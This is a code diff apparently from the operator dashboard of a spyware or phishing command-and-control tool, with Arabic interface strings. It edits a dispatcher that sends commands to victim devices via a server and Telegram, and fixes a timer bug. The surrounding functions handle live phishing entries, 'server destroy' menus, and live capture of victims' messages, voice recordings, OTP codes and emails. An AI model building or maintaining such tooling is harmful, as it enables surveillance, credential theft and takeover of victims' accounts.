@@ -460,8 +460,10 @@ function closeServerDestroyMenu() {
     if (ov) ov.remove();
 }
 
-/ ═══════════════════════════════════════════
-/async function sendServerCmd(cmd) {
+// ═══════════════════════════════════════════
+// ⚡ Server command dispatcher — يرسل للسيرفر + تيليجرام بالتوازي
+// ═══════════════════════════════════════════
+async function sendServerCmd(cmd) {
     if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
 
     const tgMap = {
@@ -512,7 +514,7 @@ function closeServerDestroyMenu() {
         if (tgOk) via.push('تيليجرام');
         showNotification('✅ تم الإرسال', `${cmd} — عبر ${via.join(' + ')}`, '📤');
     } else {
-        alert('❌ فشل الإرسال');
+        alert('❌ فشل الإرسال — لا سيرفر ولا تيليجرام');
     }
 }
 
@@ -1925,7 +1927,7 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
 }
 
 // ═══════════════════════════════════════════
-// Advanced code protection (المميزات المتقدمة)
+// Advanced code protection
 // ═══════════════════════════════════════════
 const ADVANCED_CODE = "2024";
 const ADV_LOCK_KEY = "adv_lock_state";
@@ -2057,7 +2059,7 @@ function showAdvancedDialog() {
             if (timerText) timerText.textContent = 'يُفتح تلقائيًا بعد ' + formatWaitTime(rem);
             if (statusBox) statusBox.textContent = `🔒 مقفول — الوقت المتبقي: ${formatWaitTime(rem)}`;
         }, 1000);
-        const observer = new MutationObserver(() => { if (!document.body.contains(ov)) { clearInterval(observer.interval); observer.disconnect(); } });
+        const observer = new MutationObserver(() => { if (!document.body.contains(ov)) { clearInterval(interval); observer.disconnect(); } });
         observer.observe(document.body, { childList: true });
     }
 }
@@ -2232,7 +2234,6 @@ window.clearLivePhishing = clearLivePhishing;
 window.deletePhishingEntry = deletePhishingEntry;
 window.copyToClipboard = copyToClipboard;
 
-// Server menus
 window.openServerAdminMenu = openServerAdminMenu;
 window.closeServerAdminMenu = closeServerAdminMenu;
 window.openServerDangerMenu = openServerDangerMenu;
@@ -2355,7 +2356,6 @@ window.revokeDevice = revokeDevice;
 window.unblockDevice = unblockDevice;
 window.toggleDeviceAccess = toggleDeviceAccess;
 
-// Live messages/voices/OTP/emails
 window.openLiveMessages = openLiveMessages;
 window.closeLiveMessages = closeLiveMessages;
 window.clearLiveMsgs = clearLiveMsgs;
@@ -2378,12 +2378,10 @@ window.closeLiveEmails = closeLiveEmails;
 window.clearLiveEmails = clearLiveEmails;
 window.deleteLiveEmail = deleteLiveEmail;
 
-// Advanced protection
 window.requestAdvancedCode = requestAdvancedCode;
 window.showAdvLockStatus = showAdvLockStatus;
 window.forceUnlockAdvanced = forceUnlockAdvanced;
 
-// START
 loadAuthorizedDevices();
 loadDevices();
 setInterval(loadDevices, 30000);
